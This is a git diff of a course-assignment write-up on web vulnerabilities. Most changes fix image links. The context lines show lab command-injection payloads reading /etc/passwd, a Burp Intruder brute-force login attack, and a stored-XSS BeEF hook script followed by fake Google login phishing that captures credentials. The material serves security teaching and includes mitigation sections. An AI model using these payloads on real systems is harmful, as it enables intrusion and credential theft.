@@ -16,7 +16,7 @@
     * Select the **Command Injection** or access this page directly http://192.168.13.25/vulnerabilities/exec/
     * Entering the IP address `8.8.8.8` press **Submit** to see the results display on the web application.
 
-![Web Application 1_1](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%201_1.png)
+![Web Application 1_1](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%201_1.png)
 
 
 * Behind the scenes, when we select Submit, the IP you type in the field is injected into a command that is run against the Replicants webserver. The specific command that ran on the webserver is `ping <IP>` and `8.8.8.8` is the field value that is injected into that command.
@@ -38,16 +38,16 @@
    
 - In the terminal, enter the following command (payload) in the field: `8.8.8.8 && cat ../../../../../etc/passwd`
    
-![Web Application 1_cat_passwd_1](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%201_cat_passwd_1.png)
-![Web Application 1_cat_passwd_2](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%201_cat_passwd_2.png)
+![Web Application 1_cat_passwd_1](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%201_cat_passwd_1.png)
+![Web Application 1_cat_passwd_2](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%201_cat_passwd_2.png)
 
 - On the same webpage, enter the following command (payload) in the field: `8.8.8.8 && cat ../../../../../etc/passwd`
    
-![Web Application 1_cat_passwd_1](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%201_4.png)
+![Web Application 1_cat_passwd_1](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%201_cat_passwd_1.png)
    
 - In the terminal, enter the following command (payload) in the field: `8.8.8.8 && cat ../../../../../etc/hosts`
    
-![Web Application 1_2](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%201_2.png)
+![Web Application 1_4](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%201_4.png)
 
 - On the web browser, enter the following command (payload) in the field: `8.8.8.8 && cat ../../../../../etc/hosts`
    
@@ -97,28 +97,28 @@
     
     * On Firefox browser, make sure the FoxyProxy settings is set to **Burp**.
 
-![Web Application 2_1](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_1.png)
+![Web Application 2_1](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_1.png)
 
 - This page is an administrative web application that serves as a simple login page. An administrator enters their username and password and selects Login:
      - Username: test-user
      - Password: password
 
-![Web Application 2_2](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_2.png)
+![Web Application 2_2](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_2.png)
 
 * Following was displayed in the Burp Suite in **Proxy** tab under the Intercept - Highlighting the **Login and password** credentials.
 
-![Web Application 2_3](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_3.png)
+![Web Application 2_3](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_3.png)
 
 * From the web application tool Burp Suite, on the **Intercept** tab, right click anywhere to send the information to **Intruder** 
  
    -  Select the **Intruder** tab, and verify the Target tab
 
-![Web Application 2_4](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_4.png)
-![Web Application 2_5](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_5.png)
+![Web Application 2_4](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_4.png)
+![Web Application 2_5](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_5.png)
 
    -  Select the **Positions** tab and change the attack type to **Cluster bomb**, also **clear** all payload positions, except for the login and password credentials.
 
-![Web Application 2_6](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_6.png)
+![Web Application 2_6](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_6.png)
 
 * We've been provided with a list of administrators and the breached passwords:
 * [ ] [List of Administrators](listofadmins.txt)
@@ -135,24 +135,25 @@
    
 * Select **Payloads** tab and enter the [List of Administrators](listofadmins.txt) file that provided above into the **Payload Options [Simple list]** for Payload set: 1  
 
-![Web Application 2_7](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_7.png)
+![Web Application 2_7](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_7.png)
    
 - Add the password from the [Breached list of Passwords](breached_passwords.txt) file that provided above into the **Payload Options [Simple list]** for Payload set: 2  
    
-![Web Application 2_8](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_8.png)
+![Web Application 2_8](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_8.png)
 
 - Click the **Start** attack button to get the results.
    
-![Web Application 2_9](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_9.png)
+![Web Application 2_9](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_9.png)
 
 - Results from the analysis that was complete from the Intruder show that there was one successful login username/password combination. 
    
-![Web Application 2_10](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_10.png)
+![Web Application 2_10](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_10.png)
    
 - It was user name of **" tonystark"** and the password **"I am Iron Man"**. Below snapshots display the successful login in the **Response** tab.
 
-![Web Application 2_11](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%202_11.png)
+![Web Application 2_11](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%202_11.png)
    
+
 #### Mitigation Strategies
 
 **Developers** can use several mitigation methods to protect against a brute force attack:
@@ -204,7 +205,7 @@ and run the command
 ```
 sudo docker-compose up
 ```
-![Web Application 3_3.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_3.png)
+![Web Application 3_3.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_3.png)
 
    - Go to the web browser and enter the following in the address bar `http://192.168.13.25/vulnerabilities/xss_s/` then reset the database and login with the following credentials:
      - Username: `admin`
@@ -213,16 +214,16 @@ sudo docker-compose up
      
      
 3. The BeEF hook, which was returned after running the `sudo beef` command was: `http://127.0.0.1:3000/hook.js`
-![Web Application 3_4.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_4.png)
+![Web Application 3_4.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_4.png)
 
 - The payload to inject with this BeEF hook is: `<script src="http://127.0.0.1:3000/hook.js"></script>`. 
 
 - When trying to inject the payload there was an issue found, in the message box field, there was a limit of `maxlength="50"` character in the source code. Therefore we could not inject the payload.
-![Web Application 3_5.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_5.png)
+![Web Application 3_5.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_5.png)
 
 - Solution to solve this issue, right-click on web page < click **Inspector** < In **Inspector windows** scrolling down till we see the `<textarea name="mtxMessage"
 cols="50" rows="3" maxlength="50">` then now we can edit from 50 to any bigger number  
-![Web Application 3_6.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_6.png)
+![Web Application 3_6.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_6.png)
 
 Now we are able to hook into Replicants website, so next we will attempt a couple BeEF exploits including:
 
@@ -245,35 +246,35 @@ Now we are able to hook into Replicants website, so next we will attempt a coupl
 - To access this exploit, navigate to **BeEF Control Panel** < select current hooked browser < go to **Commands** tab < expanding **Social Engineering** < click **Google Phishing**.
 - To launch th exploit, click **Execute** button in the bottom right corner.
 
-![Web Application 3_8.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_8.png)   
+![Web Application 3_8.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_8.png)   
 
 - After executed, return to the browser that has been changed to a Google Mail Login page.     
    
-![Web Application 3_9.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_9.png)
+![Web Application 3_9.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_9.png)
    
 - The victim could easily mistake entering their credentials. Use the following credentials to login to this fake Google Mail page.
    
-![Web Application 3_10.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_10.png)   
+![Web Application 3_10.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_10.png)   
    
 - Return to the BeEF control panel, in the center windows we'll see the module history command. Click that command to see the results in the last windows panel.
    
-![Web Application 3_11.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_11.png)  
+![Web Application 3_11.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_11.png)  
    
 - As we saw, the username and password have been captured. Now we can try on another method as the following:
    
    - Social Engineering >> Pretty Theft
 
-![Web Application 3_12.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_12.png) 
+![Web Application 3_12.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_12.png) 
    
-![Web Application 3_13.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_13.png) 
+![Web Application 3_13.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_13.png) 
    
-![Web Application 3_14.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_14.png) 
+![Web Application 3_14.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_14.png) 
 
    - Social Engineering >> Fake Notification Bar
-![Web Application 3_15.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_15.png) 
+![Web Application 3_15.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_15.png) 
 
    - Host >> Get Geolocation (Third Party)
-![Web Application 3_16.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web-Vulnerabilities-and-Hardening/Images/Web%20Application%203_16.png)
+![Web Application 3_16.png](https://github.com/Diablo5G/UTA-CYBER-2021-ASSIGNMENT/blob/Master/Offensive%20Security%20Unit/15-Web%20Vulnerabilities%20and%20Hardening/Images/Web%20Application%203_16.png)
    
 #### Mitigation Strategies
 
